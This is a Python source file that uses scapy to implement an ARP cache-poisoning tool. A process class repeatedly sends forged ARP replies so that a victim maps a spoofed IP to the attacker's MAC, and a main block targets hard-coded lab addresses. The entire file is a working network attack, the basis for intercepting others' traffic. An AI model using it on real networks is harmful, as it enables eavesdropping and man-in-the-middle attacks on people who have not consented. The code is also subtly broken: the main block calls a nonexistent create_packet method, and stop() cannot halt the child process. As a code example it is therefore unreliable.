from scapy.all import *
import multiprocessing
import time

class ArpPoisoner(multiprocessing.Process):

    def __init__(self, interface):

        multiprocessing.Process.__init__(self)

        self.interface = interface    #enp0s3
        self.packets = []    #The packets which will be used to spoof

    def add_packet(self, mac_attacker, mac_victim, ip_to_spoof, ip_victim):
        """"Creates an ARP packet that gets added to the packets list to be used for spoofing""" 
        
        #Initialize packet
        packet = Ether()/ARP()    
        #Set values for the mac and ip addresses
        packet[Ether].src = mac_attacker
        packet[ARP].hwsrc = mac_attacker
        packet[ARP].hwdst = mac_victim
        packet[ARP].psrc  = ip_to_spoof
        packet[ARP].pdst  = ip_victim

        self.packets.append(packet)

    def clear_packets(self):
        """Empties the packets list"""
        self.packets = []

    def run(self):
        """"Starts sending out the spoofing packets on the interface repeatedly. Will not stop by itself."""

        self.exit = False

        while not self.exit:
            
            for packet in self.packets:
                sendp(packet, iface = self.interface, verbose=0)
            
            time.sleep(1)

    def stop(self):
        """Stops the sending of the spoofing packets."""

        self.exit = True


if __name__ == "__main__":
    
    arp_poisoner = ArpPoisoner("enp0s3")

    arp_poisoner.create_packet("08:00:27:cc:08:6f", "08:00:27:b7:c4:af", "192.168.56.102", "192.168.56.101")

    arp_poisoner.start()
    time.sleep(5)
    arp_poisoner.stop()
